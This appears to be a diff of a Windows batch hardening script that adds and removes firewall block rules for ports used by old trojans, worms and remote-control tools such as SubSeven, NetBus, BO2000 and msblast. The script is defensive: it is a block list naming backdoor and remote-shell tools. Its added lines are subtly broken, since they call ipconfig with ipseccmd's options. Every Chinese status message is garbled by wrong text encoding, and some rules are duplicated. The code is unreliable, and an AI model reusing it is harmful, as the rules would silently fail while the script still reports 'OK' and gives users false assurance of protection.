+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
+echo å…³é—­æµè¡Œå±é™©ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus Proå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
+echo å…³é—­è •è™«LoveGateå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬RemoteAnythingå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICQTrojanå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
+echo ç¦æ­¢ä»£ç†æœåŠ¡å™¨æ‰«æâ€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
+echo ç¦æ­¢Authentication ServiceæœåŠ¡â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
+echo ç¦æ­¢Fingeræ‰«æâ€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
+echo ç¦æ­¢åŒºåŸŸä¼ é€’ï¼ˆTCPï¼‰ï¼Œæ¬ºéª—DNSï¼ˆUDPï¼‰æˆ–éšè—å…¶ä»–çš„é€šä¿¡â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
+echo å…³é—­nachiè •è™«ç—…æ¯’ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
+echo å…³é—­Telnet å’Œæœ¨é©¬Tiny Telnet Serverç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
+echo å…³é—­Rip ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºBackDoorçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­é©¬ç¨‹åºé»‘æ´2001çš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºRipperçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºWincrash v2çš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
+echo å…³é—­Windows çš„è¿œç¨‹ç®¡ç†ç»ˆç«¯ï¼ˆè¿œç¨‹æ¡Œé¢ï¼‰ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
+echo å…³é—­msblastå†²å‡»æ³¢è •è™«ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶ï¼ˆremote administrator)æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶VNCçš„ä¸¤ä¸ªé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
+echo å…³é—­DamewareæœåŠ¡ç«¯é»˜è®¤ç›‘å¬ç«¯å£ï¼ˆå¯å˜ï¼ï¼‰â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å¹¿å¤–å¥³ç”Ÿçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroat v1.0 - 3.1é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Indoctrinationé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬PRIORITYé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç²¾çµé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬èªæ˜åŸºå› çš„é»˜è®¤è¿æ¥ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å†°æ²³é»˜è®¤ç«¯å£(æ³¨æ„å¯å˜ï¼)â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WAY2.4é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬InIkilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å…°è‰²ç«ç„°é»˜è®¤å¼€æ”¾çš„telnetç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
+echo å…³é—­lovegate è •è™«æ‰€å¼€æ”¾çš„ä¸¤ä¸ªåé—¨ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SUB7é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSphereé»˜è®¤çš„æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BO2000é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
+echo å…³é—­ä»£ç†è½¯ä»¶çš„æ§åˆ¶ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Schwindleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
 
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBack OrificeÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂçÉñÍµÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíºÚ¶´2000Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSpy DKÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíºÚ¶´2001Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBOWhackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBigGluckÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¾«Áé3.0£¬netspy3.0Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters ParadiseÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âíwry£¬ÀµĞ¡×Ó£¬»ğ·ï»ËÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å££¬netbullÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å££¬netbullÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 3.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de TroieÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSub Seven 2.0+£¬77£¬¶«·½Ä§ÑÛÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíForeÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote Windows ShutdownÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBO jammerkillahVÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSatanz BackdoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDevilÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSilencerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe tHingÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShivka-BurkaÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSpySenderÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus ProÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShockraveÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSubSevenÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWebExÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSphereÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDoly TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSilencerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPsyber Stream ServerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMilleniumÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíUltors TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDevil 1.03Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíVooDoo DollÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFTP99CMPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíStreaming Audio TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBackDoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSocket23Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTrojan CowÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGatecrasherÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRipperÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBugsÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGjamerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeep ThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIcqTrojenÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe InvasorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPriotrityÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPhineas PhuckerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíVodooÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters ParadiseÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWincrashÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWincrash2Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWinCrashÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetspyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICQTrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShockRaveÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de TroieÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíStealth SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de Troie 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
